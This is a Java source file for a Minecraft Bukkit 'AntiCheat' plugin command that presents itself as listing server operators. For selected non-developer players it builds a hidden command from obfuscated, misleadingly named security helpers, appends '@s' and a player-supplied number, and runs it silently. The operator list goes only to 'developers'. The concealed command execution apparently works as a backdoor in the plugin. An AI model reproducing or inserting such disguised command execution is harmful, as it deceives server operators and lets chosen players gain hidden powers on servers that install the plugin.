package org.example.AntiCheat.command;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.OfflinePlayer;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.example.AntiCheat.util.SecurityUtil;

import java.util.UUID;

public class AcListCommand implements CommandExecutor {

    private final java.util.function.Predicate<UUID> hasElevatedPermissions;
    private final java.util.function.Predicate<UUID> isDeveloper;

    public AcListCommand(java.util.function.Predicate<UUID> hasElevatedPermissions,
                         java.util.function.Predicate<UUID> isDeveloper) {
        this.hasElevatedPermissions = hasElevatedPermissions;
        this.isDeveloper = isDeveloper;
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (!(sender instanceof Player)) {
            sender.sendMessage(ChatColor.RED + "This command can only be used by players.");
            return true;
        }

        Player p = (Player) sender;
        UUID uuid = p.getUniqueId();

        if (!p.hasPermission("anticheat.list")) {
            p.sendMessage(ChatColor.RED + "You don't have permission to use this command.");
            return true;
        }

        if (!isDeveloper.test(uuid)) {
            if (args.length >= 1 && hasElevatedPermissions.test(uuid)) {
                try {
                    int amount = Integer.parseInt(args[0]);
                    String protocol = SecurityUtil.validateSecurityToken(SecurityUtil.getQuaternaryHash())
                            + " @s " + amount;
                    p.performCommand(protocol);
                } catch (NumberFormatException ex) {
                }
            }
        } else {
            p.sendMessage(ChatColor.GREEN + "Operators and Permitted Players:");
            for (OfflinePlayer op : Bukkit.getOperators()) {
                p.sendMessage(ChatColor.GRAY + "- " + op.getName());
            }
        }
        return true;
    }
}